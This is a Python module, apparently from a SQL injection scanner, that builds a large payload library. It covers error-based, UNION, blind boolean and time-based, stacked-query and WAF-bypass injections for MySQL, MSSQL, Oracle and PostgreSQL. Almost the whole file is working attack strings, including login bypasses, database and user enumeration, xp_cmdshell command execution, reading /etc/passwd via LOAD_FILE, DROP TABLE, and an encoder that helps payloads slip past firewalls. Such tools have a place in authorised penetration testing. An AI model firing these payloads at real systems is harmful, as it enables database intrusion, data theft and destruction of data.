"""
Payload Generator Module
Comprehensive SQL injection payload library with different attack types
"""

import random
import string
import logging

logger = logging.getLogger('sqli_scanner')

class PayloadGenerator:
    """Generate SQL injection payloads for different attack types"""
    
    def __init__(self, target_dbms=None):
        self.target_dbms = target_dbms
        self.payloads = {
            'error_based': self._get_error_based_payloads(),
            'union_based': self._get_union_based_payloads(),
            'boolean_blind': self._get_boolean_blind_payloads(),
            'time_based': self._get_time_based_payloads(),
            'stacked_queries': self._get_stacked_queries_payloads(),
            'generic': self._get_generic_payloads()
        }
    
    def get_payloads(self, injection_type='all'):
        """Get payloads for specific injection type or all types"""
        if injection_type == 'all':
            all_payloads = []
            for payload_type, payloads in self.payloads.items():
                all_payloads.extend(payloads)
            return all_payloads
        
        return self.payloads.get(injection_type, [])
    
    def get_targeted_payloads(self, dbms_type):
        """Get payloads specific to a DBMS type"""
        targeted_payloads = []
        
        for payload_type, payloads in self.payloads.items():
            for payload in payloads:
                if payload.get('dbms', 'generic') in ['generic', dbms_type]:
                    targeted_payloads.append(payload)
        
        return targeted_payloads
    
    def _get_error_based_payloads(self):
        """Error-based SQL injection payloads"""
        return [
            # Generic error payloads
            {"payload": "'", "type": "error_based", "dbms": "generic", "description": "Single quote"},
            {"payload": "\"", "type": "error_based", "dbms": "generic", "description": "Double quote"},
            {"payload": "')", "type": "error_based", "dbms": "generic", "description": "Quote with parenthesis"},
            {"payload": "'))", "type": "error_based", "dbms": "generic", "description": "Quote with double parenthesis"},
            {"payload": "'\"", "type": "error_based", "dbms": "generic", "description": "Mixed quotes"},
            {"payload": "';", "type": "error_based", "dbms": "generic", "description": "Quote with semicolon"},
            {"payload": "' OR '1'='1", "type": "error_based", "dbms": "generic", "description": "Classic OR injection"},
            {"payload": "\" OR \"1\"=\"1", "type": "error_based", "dbms": "generic", "description": "Double quote OR injection"},
            {"payload": "' OR 1=1--", "type": "error_based", "dbms": "generic", "description": "OR with comment"},
            {"payload": "' OR 1=1#", "type": "error_based", "dbms": "generic", "description": "OR with hash comment"},
            {"payload": "' OR 1=1/*", "type": "error_based", "dbms": "generic", "description": "OR with C-style comment"},
            
            # MySQL specific
            {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", 
             "type": "error_based", "dbms": "mysql", "description": "MySQL version extraction"},
            {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))--", 
             "type": "error_based", "dbms": "mysql", "description": "MySQL EXTRACTVALUE error"},
            {"payload": "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)--", 
             "type": "error_based", "dbms": "mysql", "description": "MySQL UPDATEXML error"},
            {"payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", 
             "type": "error_based", "dbms": "mysql", "description": "MySQL database name extraction"},
            
            # MSSQL specific
            {"payload": "' AND 1=CONVERT(int, @@version)--", 
             "type": "error_based", "dbms": "mssql", "description": "MSSQL version extraction"},
            {"payload": "' AND 1=CAST(@@version AS int)--", 
             "type": "error_based", "dbms": "mssql", "description": "MSSQL version cast error"},
            {"payload": "' AND 1=CONVERT(int, DB_NAME())--", 
             "type": "error_based", "dbms": "mssql", "description": "MSSQL database name"},
            {"payload": "' AND 1=CONVERT(int, USER_NAME())--", 
             "type": "error_based", "dbms": "mssql", "description": "MSSQL user name"},
            
            # Oracle specific
            {"payload": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--", 
             "type": "error_based", "dbms": "oracle", "description": "Oracle version extraction"},
            {"payload": "' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--", 
             "type": "error_based", "dbms": "oracle", "description": "Oracle UTL_INADDR error"},
            {"payload": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--", 
             "type": "error_based", "dbms": "oracle", "description": "Oracle current user"},
            
            # PostgreSQL specific
            {"payload": "' AND 1=CAST(version() AS int)--", 
             "type": "error_based", "dbms": "postgresql", "description": "PostgreSQL version extraction"},
            {"payload": "' AND 1=CAST(current_database() AS int)--", 
             "type": "error_based", "dbms": "postgresql", "description": "PostgreSQL database name"},
            {"payload": "' AND 1=CAST(current_user AS int)--", 
             "type": "error_based", "dbms": "postgresql", "description": "PostgreSQL current user"},
        ]
    
    def _get_union_based_payloads(self):
        """UNION-based SQL injection payloads"""
        payloads = []
        
        # Generate UNION payloads with different column counts
        for cols in range(1, 21):  # Test up to 20 columns
            null_cols = ','.join(['NULL'] * cols)
            
            payloads.extend([
                {"payload": f"' UNION SELECT {null_cols}--", 
                 "type": "union_based", "dbms": "generic", "description": f"UNION with {cols} columns"},
                {"payload": f"' UNION ALL SELECT {null_cols}--", 
                 "type": "union_based", "dbms": "generic", "description": f"UNION ALL with {cols} columns"},
                {"payload": f"') UNION SELECT {null_cols}--", 
                 "type": "union_based", "dbms": "generic", "description": f"UNION with parenthesis and {cols} columns"},
            ])
        
        # Database-specific UNION payloads
        union_payloads = [
            # MySQL
            {"payload": "' UNION SELECT 1,VERSION(),3,4,5--", 
             "type": "union_based", "dbms": "mysql", "description": "MySQL version via UNION"},
            {"payload": "' UNION SELECT 1,DATABASE(),3,4,5--", 
             "type": "union_based", "dbms": "mysql", "description": "MySQL database name via UNION"},
            {"payload": "' UNION SELECT 1,USER(),3,4,5--", 
             "type": "union_based", "dbms": "mysql", "description": "MySQL user via UNION"},
            {"payload": "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--", 
             "type": "union_based", "dbms": "mysql", "description": "MySQL table names"},
            
            # MSSQL
            {"payload": "' UNION SELECT 1,@@version,3,4,5--", 
             "type": "union_based", "dbms": "mssql", "description": "MSSQL version via UNION"},
            {"payload": "' UNION SELECT 1,DB_NAME(),3,4,5--", 
             "type": "union_based", "dbms": "mssql", "description": "MSSQL database name via UNION"},
            {"payload": "' UNION SELECT 1,USER_NAME(),3,4,5--", 
             "type": "union_based", "dbms": "mssql", "description": "MSSQL user via UNION"},
            {"payload": "' UNION SELECT 1,name,3,4,5 FROM sysobjects WHERE xtype='U'--", 
             "type": "union_based", "dbms": "mssql", "description": "MSSQL table names"},
            
            # Oracle
            {"payload": "' UNION SELECT 1,banner,3,4,5 FROM v$version--", 
             "type": "union_based", "dbms": "oracle", "description": "Oracle version via UNION"},
            {"payload": "' UNION SELECT 1,user,3,4,5 FROM dual--", 
             "type": "union_based", "dbms": "oracle", "description": "Oracle user via UNION"},
            {"payload": "' UNION SELECT 1,table_name,3,4,5 FROM all_tables--", 
             "type": "union_based", "dbms": "oracle", "description": "Oracle table names"},
            
            # PostgreSQL
            {"payload": "' UNION SELECT 1,version(),3,4,5--", 
             "type": "union_based", "dbms": "postgresql", "description": "PostgreSQL version via UNION"},
            {"payload": "' UNION SELECT 1,current_database(),3,4,5--", 
             "type": "union_based", "dbms": "postgresql", "description": "PostgreSQL database name via UNION"},
            {"payload": "' UNION SELECT 1,current_user,3,4,5--", 
             "type": "union_based", "dbms": "postgresql", "description": "PostgreSQL user via UNION"},
        ]
        
        payloads.extend(union_payloads)
        return payloads
    
    def _get_boolean_blind_payloads(self):
        """Boolean-based blind SQL injection payloads"""
        return [
            # Generic boolean tests
            {"payload": "' AND 1=1--", "type": "boolean_blind", "dbms": "generic", "description": "True condition"},
            {"payload": "' AND 1=2--", "type": "boolean_blind", "dbms": "generic", "description": "False condition"},
            {"payload": "' AND 'a'='a'--", "type": "boolean_blind", "dbms": "generic", "description": "String comparison true"},
            {"payload": "' AND 'a'='b'--", "type": "boolean_blind", "dbms": "generic", "description": "String comparison false"},
            {"payload": "' AND (1)=(1)--", "type": "boolean_blind", "dbms": "generic", "description": "Parenthesis true"},
            {"payload": "' AND (1)=(2)--", "type": "boolean_blind", "dbms": "generic", "description": "Parenthesis false"},
            
            # Length-based tests
            {"payload": "' AND LENGTH(DATABASE())>0--", "type": "boolean_blind", "dbms": "mysql", "description": "MySQL database length test"},
            {"payload": "' AND LEN(DB_NAME())>0--", "type": "boolean_blind", "dbms": "mssql", "description": "MSSQL database length test"},
            {"payload": "' AND LENGTH(user)>0--", "type": "boolean_blind", "dbms": "oracle", "description": "Oracle user length test"},
            {"payload": "' AND LENGTH(current_database())>0--", "type": "boolean_blind", "dbms": "postgresql", "description": "PostgreSQL database length test"},
            
            # Substring tests
            {"payload": "' AND SUBSTRING(DATABASE(),1,1)='a'--", "type": "boolean_blind", "dbms": "mysql", "description": "MySQL substring test"},
            {"payload": "' AND SUBSTRING(DB_NAME(),1,1)='a'--", "type": "boolean_blind", "dbms": "mssql", "description": "MSSQL substring test"},
            {"payload": "' AND SUBSTR(user,1,1)='a'--", "type": "boolean_blind", "dbms": "oracle", "description": "Oracle substring test"},
            {"payload": "' AND SUBSTRING(current_database(),1,1)='a'--", "type": "boolean_blind", "dbms": "postgresql", "description": "PostgreSQL substring test"},
            
            # ASCII tests
            {"payload": "' AND ASCII(SUBSTRING(DATABASE(),1,1))>64--", "type": "boolean_blind", "dbms": "mysql", "description": "MySQL ASCII test"},
            {"payload": "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>64--", "type": "boolean_blind", "dbms": "mssql", "description": "MSSQL ASCII test"},
            {"payload": "' AND ASCII(SUBSTR(user,1,1))>64--", "type": "boolean_blind", "dbms": "oracle", "description": "Oracle ASCII test"},
            {"payload": "' AND ASCII(SUBSTRING(current_database(),1,1))>64--", "type": "boolean_blind", "dbms": "postgresql", "description": "PostgreSQL ASCII test"},
        ]
    
    def _get_time_based_payloads(self):
        """Time-based blind SQL injection payloads"""
        return [
            # MySQL time-based
            {"payload": "' AND SLEEP(5)--", "type": "time_based", "dbms": "mysql", "description": "MySQL SLEEP function", "delay": 5},
            {"payload": "' AND (SELECT SLEEP(5))--", "type": "time_based", "dbms": "mysql", "description": "MySQL SELECT SLEEP", "delay": 5},
            {"payload": "' AND BENCHMARK(5000000,MD5(1))--", "type": "time_based", "dbms": "mysql", "description": "MySQL BENCHMARK function", "delay": 3},
            {"payload": "' AND IF(1=1,SLEEP(5),0)--", "type": "time_based", "dbms": "mysql", "description": "MySQL conditional SLEEP", "delay": 5},
            
            # MSSQL time-based
            {"payload": "'; WAITFOR DELAY '00:00:05'--", "type": "time_based", "dbms": "mssql", "description": "MSSQL WAITFOR DELAY", "delay": 5},
            {"payload": "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8)--", 
             "type": "time_based", "dbms": "mssql", "description": "MSSQL heavy query", "delay": 3},
            {"payload": "'; IF(1=1) WAITFOR DELAY '00:00:05'--", "type": "time_based", "dbms": "mssql", "description": "MSSQL conditional delay", "delay": 5},
            
            # Oracle time-based
            {"payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5)--", 
             "type": "time_based", "dbms": "oracle", "description": "Oracle DBMS_PIPE delay", "delay": 5},
            {"payload": "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--", 
             "type": "time_based", "dbms": "oracle", "description": "Oracle heavy query", "delay": 3},
            
            # PostgreSQL time-based
            {"payload": "'; SELECT pg_sleep(5)--", "type": "time_based", "dbms": "postgresql", "description": "PostgreSQL pg_sleep", "delay": 5},
            {"payload": "' AND 1=(SELECT COUNT(*) FROM generate_series(1,1000000))--", 
             "type": "time_based", "dbms": "postgresql", "description": "PostgreSQL heavy query", "delay": 3},
            {"payload": "' AND (SELECT 1 FROM pg_sleep(5))--", "type": "time_based", "dbms": "postgresql", "description": "PostgreSQL SELECT pg_sleep", "delay": 5},
            
            # Generic time-based (might work on multiple DBMS)
            {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "type": "time_based", "dbms": "generic", "description": "Generic sleep attempt", "delay": 5},
        ]
    
    def _get_stacked_queries_payloads(self):
        """Stacked queries SQL injection payloads"""
        return [
            # Generic stacked queries
            {"payload": "'; SELECT 1--", "type": "stacked_queries", "dbms": "generic", "description": "Basic stacked query"},
            {"payload": "'; SELECT SLEEP(5)--", "type": "stacked_queries", "dbms": "mysql", "description": "MySQL stacked sleep"},
            {"payload": "'; WAITFOR DELAY '00:00:05'--", "type": "stacked_queries", "dbms": "mssql", "description": "MSSQL stacked delay"},
            
            # Information gathering via stacked queries
            {"payload": "'; INSERT INTO temp_table VALUES (@@version)--", "type": "stacked_queries", "dbms": "mssql", "description": "MSSQL version insertion"},
            {"payload": "'; CREATE TABLE test_table (id INT)--", "type": "stacked_queries", "dbms": "generic", "description": "Table creation test"},
            {"payload": "'; DROP TABLE test_table--", "type": "stacked_queries", "dbms": "generic", "description": "Table deletion test"},
            
            # Command execution attempts (dangerous - use with caution)
            {"payload": "'; EXEC xp_cmdshell('ping 127.0.0.1')--", "type": "stacked_queries", "dbms": "mssql", "description": "MSSQL command execution"},
            {"payload": "'; SELECT LOAD_FILE('/etc/passwd')--", "type": "stacked_queries", "dbms": "mysql", "description": "MySQL file reading"},
        ]
    
    def _get_generic_payloads(self):
        """Generic SQL injection payloads"""
        return [
            # Basic injection tests
            {"payload": "1'", "type": "generic", "dbms": "generic", "description": "Numeric with quote"},
            {"payload": "1\"", "type": "generic", "dbms": "generic", "description": "Numeric with double quote"},
            {"payload": "1' OR '1'='1", "type": "generic", "dbms": "generic", "description": "Numeric OR injection"},
            {"payload": "1\" OR \"1\"=\"1", "type": "generic", "dbms": "generic", "description": "Numeric double quote OR"},
            {"payload": "admin'--", "type": "generic", "dbms": "generic", "description": "Admin bypass attempt"},
            {"payload": "admin\"--", "type": "generic", "dbms": "generic", "description": "Admin bypass double quote"},
            {"payload": "' OR 1=1 LIMIT 1--", "type": "generic", "dbms": "mysql", "description": "MySQL LIMIT bypass"},
            {"payload": "' OR 1=1 OFFSET 0 ROWS--", "type": "generic", "dbms": "mssql", "description": "MSSQL OFFSET bypass"},
            
            # Encoded payloads
            {"payload": "%27%20OR%20%271%27%3D%271", "type": "generic", "dbms": "generic", "description": "URL encoded OR injection"},
            {"payload": "&#39; OR &#39;1&#39;=&#39;1", "type": "generic", "dbms": "generic", "description": "HTML encoded OR injection"},
            
            # WAF bypass attempts
            {"payload": "' /**/OR/**/ '1'='1", "type": "generic", "dbms": "generic", "description": "Comment-based WAF bypass"},
            {"payload": "' %0aOR%0a '1'='1", "type": "generic", "dbms": "generic", "description": "Newline WAF bypass"},
            {"payload": "' %09OR%09 '1'='1", "type": "generic", "dbms": "generic", "description": "Tab WAF bypass"},
            {"payload": "'/**/UNION/**/SELECT", "type": "generic", "dbms": "generic", "description": "UNION comment bypass"},
            {"payload": "'+UNION+SELECT+", "type": "generic", "dbms": "generic", "description": "Plus sign bypass"},
            {"payload": "'%20UNION%20SELECT%20", "type": "generic", "dbms": "generic", "description": "URL encoded spaces"},
        ]
    
    def generate_custom_payload(self, base_payload, parameter_name, injection_point='value'):
        """Generate custom payload for specific parameter and injection point"""
        if injection_point == 'value':
            return base_payload
        elif injection_point == 'parameter':
            return f"{parameter_name}{base_payload}"
        elif injection_point == 'header':
            return f"X-{parameter_name}: {base_payload}"
        else:
            return base_payload
    
    def get_waf_bypass_payloads(self):
        """Get payloads specifically designed to bypass WAFs"""
        return [
            {"payload": "' /**/OR/**/ '1'='1'/**/--", "type": "waf_bypass", "description": "MySQL comment bypass"},
            {"payload": "' %0aOR%0a '1'='1'%0a--", "type": "waf_bypass", "description": "Newline bypass"},
            {"payload": "' %09OR%09 '1'='1'%09--", "type": "waf_bypass", "description": "Tab bypass"},
            {"payload": "' %0cOR%0c '1'='1'%0c--", "type": "waf_bypass", "description": "Form feed bypass"},
            {"payload": "' %0dOR%0d '1'='1'%0d--", "type": "waf_bypass", "description": "Carriage return bypass"},
            {"payload": "' %a0OR%a0 '1'='1'%a0--", "type": "waf_bypass", "description": "Non-breaking space bypass"},
            {"payload": "'+UNION+SELECT+NULL--", "type": "waf_bypass", "description": "Plus sign bypass"},
            {"payload": "'%20UNION%20SELECT%20NULL--", "type": "waf_bypass", "description": "URL encoded bypass"},
            {"payload": "' UNION/**/SELECT/**/NULL--", "type": "waf_bypass", "description": "Comment separation"},
            {"payload": "' /*!UNION*/ /*!SELECT*/ NULL--", "type": "waf_bypass", "description": "MySQL version comment"},
            {"payload": "' %55NION %53ELECT NULL--", "type": "waf_bypass", "description": "URL encoded keywords"},
            {"payload": "' UnIoN SeLeCt NULL--", "type": "waf_bypass", "description": "Case variation"},
        ]

class CustomPayloadLoader:
    """Load custom payloads from external files"""
    
    def __init__(self, payload_file=None):
        self.payload_file = payload_file
        self.custom_payloads = []
        
        if payload_file:
            self.load_payloads()
    
    def load_payloads(self):
        """Load payloads from file"""
        try:
            with open(self.payload_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Simple format: payload|type|dbms|description
                        parts = line.split('|')
                        if len(parts) >= 1:
                            payload_data = {
                                'payload': parts[0],
                                'type': parts[1] if len(parts) > 1 else 'custom',
                                'dbms': parts[2] if len(parts) > 2 else 'generic',
                                'description': parts[3] if len(parts) > 3 else 'Custom payload'
                            }
                            self.custom_payloads.append(payload_data)
            
            logger.info(f"Loaded {len(self.custom_payloads)} custom payloads from {self.payload_file}")
            
        except Exception as e:
            logger.error(f"Failed to load custom payloads: {str(e)}")
    
    def get_payloads(self):
        """Get loaded custom payloads"""
        return self.custom_payloads

def generate_random_string(length=8):
    """Generate random string for payload testing"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def encode_payload(payload, encoding_type='url'):
    """Encode payload for WAF bypass"""
    if encoding_type == 'url':
        import urllib.parse
        return urllib.parse.quote(payload)
    elif encoding_type == 'html':
        import html
        return html.escape(payload)
    elif encoding_type == 'hex':
        return '0x' + payload.encode().hex()
    else:
        return payload
